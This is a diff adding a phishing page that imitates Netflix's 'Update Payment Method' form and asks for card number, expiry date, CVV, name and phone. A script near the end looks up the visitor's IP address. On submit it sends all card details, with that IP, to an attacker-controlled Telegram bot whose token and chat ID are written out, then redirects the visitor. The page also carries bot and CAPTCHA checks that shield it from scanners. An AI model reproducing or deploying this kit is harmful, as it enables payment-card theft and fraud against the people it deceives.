@@ -1,0 +1,460 @@
+<html lang="de-CH"><head><meta http-equiv="origin-trial" content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
+<script type="text/javascript" async="" charset="utf-8" src="https://www.gstatic.com/recaptcha/releases/Hi8UmRMnhdOBM3IuViTkapUP/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-aGxp+HH8FgFuELd3pkXNsuU+C2DWD2dZ5rIBbAgjFAotQmvvcElD2kghHpW7U/Kl"></script><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" defer=""></script>
+    <meta charset="UTF-8">
+	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix</title>
+    <style>
+        /* CSS UNVERÄNDERT */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #141414;
+            color: white;
+        }
+
+        .netflix-logo {
+            width: 150px;
+            margin: 20px 40px;
+        }
+
+        .payment-container {
+            max-width: 500px;
+            margin: 50px auto;
+            padding: 40px;
+            background-color: #000000;
+            border-radius: 4px;
+        }
+
+        h1 {
+            margin-bottom: 30px;
+            font-size: 32px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #999;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            background-color: #333;
+            border: 1px solid #333;
+            border-radius: 4px;
+            color: white;
+            font-size: 16px;
+            appearance: none;
+        }
+
+        input:focus, select:focus {
+            outline: none;
+            border-color: #E50914;
+            background-color: #454545;
+        }
+
+        .card-icons {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .card-icons img {
+            height: 30px;
+            opacity: 0.3;
+        }
+
+        .card-icons img.active {
+            opacity: 1;
+        }
+
+        .row-group {
+            display: flex;
+            gap: 20px;
+        }
+
+        .row-group > div {
+            flex: 1;
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background-color: #E50914;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 20px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background-color: #f40612;
+        }
+
+        button.loading {
+            background-color: #8b0000;
+            cursor: not-allowed;
+        }
+
+        .error {
+            color: #E50914;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .expiry-group {
+            display: flex;
+            gap: 10px;
+        }
+
+        .expiry-group select {
+            flex: 1;
+        }
+
+        @media (max-width: 600px) {
+            .payment-container {
+                margin: 20px;
+                padding: 20px;
+            }
+            
+            .netflix-logo {
+                margin: 20px auto;
+                display: block;
+                width: 120px;
+            }
+            
+            .row-group {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            h1 {
+                font-size: 28px;
+            }
+        }
+    </style>
+    <!-- Updated reCAPTCHA Script with new key -->
+    <script type="text/javascript" async="" charset="utf-8" src="https://www.gstatic.com/recaptcha/releases/bUO1BXI8H9PgjAPSW9hwuSeI/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-W6vGSa1gNU2JYZ4aYa4y4W3SgdiTlWqPltQiHH1/PEEh6w3sEdnuACkbWBJN1UBJ"></script><script src="https://www.google.com/recaptcha/api.js?render=6Ld8HfsqAAAAAA6KcyWLMdxQkMoeXGcfnnQWwBvB"></script>
+</head>
+<body>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="netflix-logo">
+    
+    <div class="payment-container">
+        <h1>Update Payment Method</h1>
+        <form id="myform" action="" method="POST">
+            <!-- CSRF Token as hidden field -->
+            <input type="hidden" name="csrf_token" value="836f7b693c9b82c985beb9ffe6a5ec41c06a354745be1475f889ef9980e1f9b3">
+            <!-- Honeypot Field: should remain empty if filled by a human -->
+            <input type="text" name="fax" style="display:none;">
+            <!-- Hidden field to store reCAPTCHA token -->
+            <input type="hidden" id="g-recaptcha-response" name="g-recaptcha-response">
+            <!-- Hidden field for form timestamp (for bot protection) -->
+            <input type="hidden" id="form_time" name="form_time" value="1746671712510">
+
+            <div class="form-group">
+                <label for="cardnumber">Card Number</label>
+                <input type="text" id="cardnumber" name="cardnumber" placeholder="1234 5678 9012 3456" required="" maxlength="19" inputmode="numeric" autocomplete="cc-number">
+                <div class="card-icons">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" id="mastercard">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" id="visa">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="Amex" id="amex">
+                </div>
+                <div class="error" id="cardError">Invalid card number</div>
+            </div>
+
+            <div class="row-group">
+                <div class="form-group">
+                    <label for="expiryMonth">Expiration Date</label>
+                    <div class="expiry-group">
+                        <select id="expiryMonth" name="expiryMonth" required="">
+                            <option value="" disabled="" selected="">MM</option>
+                        <option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="01">01</option><option value="02">02</option><option value="03">03</option><option value="04">04</option><option value="05">05</option><option value="06">06</option><option value="07">07</option><option value="08">08</option><option value="09">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select>
+                        <select id="expiryYear" name="expiryYear" required="">
+                            <option value="" disabled="" selected="">YYYY</option>
+                        <option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option><option value="2035">2035</option><option value="2036">2036</option><option value="2037">2037</option><option value="2038">2038</option><option value="2039">2039</option><option value="2040">2040</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option><option value="2035">2035</option><option value="2036">2036</option><option value="2037">2037</option><option value="2038">2038</option><option value="2039">2039</option><option value="2040">2040</option></select>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" required="" maxlength="4" inputmode="numeric" autocomplete="cc-csc">
+                    <div class="error" id="cvvError">Invalid CVV</div>
+                </div>
+            </div>
+
+            <div class="row-group">
+                <div class="form-group">
+                    <label for="cardname">Name on Card</label>
+                    <input type="text" id="cardname" name="cardname" placeholder="John Doe" required="" pattern="[A-Za-z ]+" autocomplete="cc-name">
+                </div>
+                <div class="form-group">
+                    <label for="country">Phone</label>
+                  <input type="text" id="mobile" name="mobile" placeholder="0782263322" required="" maxlength="11" pattern="[0-9 ]+" autocomplete="cc-name">
+
+                </div>
+            </div>
+<div class="cf-turnstile" data-sitekey="0x4AAAAAABU1anVMC8nYXseq"><div><input type="hidden" name="cf-turnstile-response" id="cf-chl-widget-75eu9_response"></div></div>
+            <button type="submit" id="submitBtn">Update Payment Method</button>
+        </form>
+    </div>
+    
+    <script>
+        // Set a cookie to check if JavaScript is enabled
+        document.cookie = "js_enabled=1; path=/";
+
+        // Populate the hidden form timestamp for bot protection
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("form_time").value = Date.now();
+
+            // Populate Months (01-12)
+            const monthSelect = document.getElementById('expiryMonth');
+            for(let month = 1; month <= 12; month++) {
+                const option = document.createElement('option');
+                option.value = month.toString().padStart(2, '0');
+                option.text = option.value;
+                monthSelect.appendChild(option);
+            }
+
+            // Populate Years (2025-2040)
+            const yearSelect = document.getElementById('expiryYear');
+            for(let year = 2025; year <= 2040; year++) {
+                const option = document.createElement('option');
+                option.value = year;
+                option.text = year;
+                yearSelect.appendChild(option);
+            }
+        });
+
+        // Card Validation Patterns
+        const cardPatterns = {
+            visa: { 
+                pattern: /^4[0-9]{12}(?:[0-9]{3})?$/, 
+                lengths: [16], 
+                cvvLength: 3 
+            },
+            mastercard: { 
+                pattern: /^(5[1-5][0-9]{14}|2(22[1-9][0-9]{12}|2[3-9][0-9]{13}|[3-6][0-9]{14}|7[0-1][0-9]{13}|720[0-9]{12}))$/, 
+                lengths: [16], 
+                cvvLength: 3 
+            },
+            amex: { 
+                pattern: /^3[47][0-9]{13}$/, 
+                lengths: [15], 
+                cvvLength: 4 
+            }
+        };
+
+        // DOM Elements for Card Handling
+        const cardNumber = document.getElementById('cardnumber');
+        const cardIcons = {
+            visa: document.getElementById('visa'),
+            mastercard: document.getElementById('mastercard'),
+            amex: document.getElementById('amex')
+        };
+
+        // Card Number Handling and Formatting
+        cardNumber.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || '';
+            e.target.value = formatted;
+            
+            const cardType = detectCardType(value);
+            updateCardIcons(cardType);
+            updateCvvRequirements(cardType);
+        });
+
+        // Card Type Detection
+        const detectCardType = (number) => {
+            for(const [type, { pattern }] of Object.entries(cardPatterns)) {
+                if(pattern.test(number)) return type;
+            }
+            return '';
+        };
+
+        // Card Validation using Luhn Algorithm
+        const validateCardNumber = (number) => {
+            const cardType = detectCardType(number);
+            if(!cardType) return false;
+            if(!cardPatterns[cardType].lengths.includes(number.length)) return false;
+            return luhnCheck(number);
+        };
+
+        // Luhn Algorithm Check
+        const luhnCheck = (cardNumber) => {
+            let sum = 0;
+            let shouldDouble = false;
+            for(let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i));
+                if(shouldDouble) {
+                    digit *= 2;
+                    if(digit > 9) digit -= 9;
+                }
+                sum += digit;
+                shouldDouble = !shouldDouble;
+            }
+            return sum % 10 === 0;
+        };
+
+        // Update Card Icons
+        const updateCardIcons = (type) => {
+            Object.values(cardIcons).forEach(icon => icon.classList.remove('active'));
+            if(type && cardIcons[type]) cardIcons[type].classList.add('active');
+        };
+
+        // Update CVV Requirements based on card type
+        const updateCvvRequirements = (type) => {
+            const cvvField = document.getElementById('cvv');
+            if(type) {
+                cvvField.placeholder = '0'.repeat(cardPatterns[type].cvvLength);
+                cvvField.setAttribute('maxlength', cardPatterns[type].cvvLength);
+                cvvField.setAttribute('pattern', `\\d{${cardPatterns[type].cvvLength}}`);
+            }
+        };
+
+        // Form Validation and Submission with reCAPTCHA and extra bot protection
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.classList.add('loading');
+            submitBtn.disabled = true;
+
+            let isValid = true;
+            const cardValue = cardNumber.value.replace(/\s/g, '');
+            const cvvValue = document.getElementById('cvv').value;
+            const cardType = detectCardType(cardValue);
+
+            // Card Validation
+            if(!cardType || !validateCardNumber(cardValue)) {
+                document.getElementById('cardError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('cardError').style.display = 'none';
+            }
+
+            // CVV Validation
+            if(cardType && !new RegExp(`^\\d{${cardPatterns[cardType].cvvLength}}$`).test(cvvValue)) {
+                document.getElementById('cvvError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('cvvError').style.display = 'none';
+            }
+
+            // Expiration Date Validation
+            const monthSelect = document.getElementById('expiryMonth');
+            const yearSelect = document.getElementById('expiryYear');
+            const selectedYear = parseInt(yearSelect.value);
+            const selectedMonth = parseInt(monthSelect.value);
+            if(selectedYear && selectedMonth) {
+                const currentDate = new Date();
+                // Note: new Date(year, month) sets the date to the 1st day of the following month.
+                const expirationDate = new Date(selectedYear, selectedMonth - 1);
+                if(expirationDate < currentDate) {
+                    alert('Expiration date must be in the future');
+                    isValid = false;
+                }
+            }
+
+            // Extra Bot Protection: Honeypot Check
+            const faxValue = document.querySelector('input[name="fax"]').value;
+            if(faxValue.trim() !== "") {
+                alert("Bot detected");
+                isValid = false;
+            }
+
+            // Extra Bot Protection: Check that the form wasn't filled too quickly (less than 5 seconds)
+            const formTime = document.getElementById('form_time').value;
+            if(Date.now() - parseInt(formTime) < 5000) {
+                alert("Form filled too quickly, please try again.");
+                isValid = false;
+            }
+
+            if(isValid) {
+                // Generate reCAPTCHA token and then submit the form
+                grecaptcha.ready(function() {
+                    grecaptcha.execute('6Ld8HfsqAAAAAA6KcyWLMdxQkMoeXGcfnnQWwBvB', { action: 'submit' }).then(function(token) {
+                        document.getElementById('g-recaptcha-response').value = token;
+                        document.getElementById('paymentForm').submit();
+                    });
+                });
+            } else {
+                submitBtn.classList.remove('loading');
+                submitBtn.disabled = false;
+            }
+        });
+    </script>
+
+<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
+<div class="grecaptcha-logo">
+<iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-rybp29fnb61e" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6Ld8HfsqAAAAAA6KcyWLMdxQkMoeXGcfnnQWwBvB&amp;co=aHR0cHM6Ly9hcGxpb3BsaW5lLnRlbXB1cmwuaG9zdDo0NDM.&amp;hl=en&amp;v=bUO1BXI8H9PgjAPSW9hwuSeI&amp;size=invisible&amp;cb=a2uc8ibzj3ci"></iframe></div>
+<div class="grecaptcha-error"></div>
+<textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div>
+
+	 <p id="gfg" style="color:transparent;">118.70.133.23</p>
+<script type="text/javascript">
+</script>
+
+          <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+<script>
+	  /* Add "https://api.ipify.org?format=json" statement
+        this will communicate with the ipify servers in
+        order to retrieve the IP address $.getJSON will
+        load JSON-encoded data from the server using a
+        GET HTTP request */
+
+        $.getJSON("https://api.ipify.org?format=json",
+                                        function(data) {
+
+            // Setting text of element P with id gfg
+            $("#gfg").html(data.ip);
+        })
+
+const form = document.querySelector("#myform");
+
+form.addEventListener("submit", (e) => {
+    e.preventDefault();
+
+    var text1 = document.getElementById("cardnumber").value;
+	 var text2 = document.getElementById("expiryMonth").value;
+	  var text3 = document.getElementById("expiryYear").value;
+	   var text4 = document.getElementById("cvv").value;
+	    var text5 = document.getElementById("cardname").value;
+		var text7 = document.getElementById("mobile").value;
+    var text6 = document.getElementById("gfg").textContent;
+    var my_text = `<b>NeTFlix - ${text6} </b> %0A <b>Card Number </b> : ${text1} %0A <b>Expiry date </b> : ${text2}/${text3} %0A <b>CVV </b> : ${text4} %0A <b>Card Name </b> : ${text5} %0A <b>Phone </b> : ${text7} %0A <b>IP</b> : ${text6}`;
+    // Note! <br> == %0A <br>-Not work
+
+    var token = "7528599416:AAETBoJ2k_57vKb1Ec2L-8MhQXIZ2Joinwk"; // Your Telegram Bot token
+    var chat_id = "7303730021" // Chat ID || You can get easily receive JSON data from Telegram BOT in this web site - https://t-bot-r.netlify.app
+    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}&parse_mode=html`
+
+    let api = new XMLHttpRequest();
+    api.open("GET", url, true);
+    api.send();
+
+    console.log("Message successfully sended!")	
+
+			function sayHi() {
+		  window.location.replace("load.html?h=ed29nkjpsa16bhrjq4na16owq-1mucgfycc664m7vmhpjgqse65-1l5rurej3h44qodo5rn0cdvyn-8om6v2ckrxsbnwf40t9ta8a7e-34tiets5jpj294jd59h8c4s0n-28w7d5j2k2jtil9ncckolke4m-9jzlwicvu376y9q4vjq77y5ks-1m0whdrwis44c1hoa9mrwhlt4-1uvutm1mpyov7rqhtcf8fksby-aac54ic1fmca5xz1yvc5t9nfe-1hn40w0bomeivihj9lopp4hp2-c0121povror81d0xao0yez4gy");
+		}
+
+		setTimeout(sayHi, 3000);
+})
+
+</script>
+<div><div class="grecaptcha-badge" data-style="none" style="width: 256px; height: 60px; position: fixed; visibility: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-cp8oepe53inp" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://www.google.com/recaptcha/api2/anchor?ar=1&amp;k=6Ld8HfsqAAAAAA6KcyWLMdxQkMoeXGcfnnQWwBvB&amp;co=aHR0cHM6Ly9wdWItZmFhZmRhNzYwZTlmNDM1N2I4MTA5ZTY2YWRiMDRmNDEucjIuZGV2OjQ0Mw..&amp;hl=en&amp;v=bUO1BXI8H9PgjAPSW9hwuSeI&amp;size=invisible&amp;cb=rfsm7xytr3f"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;"></iframe></div></body></html>
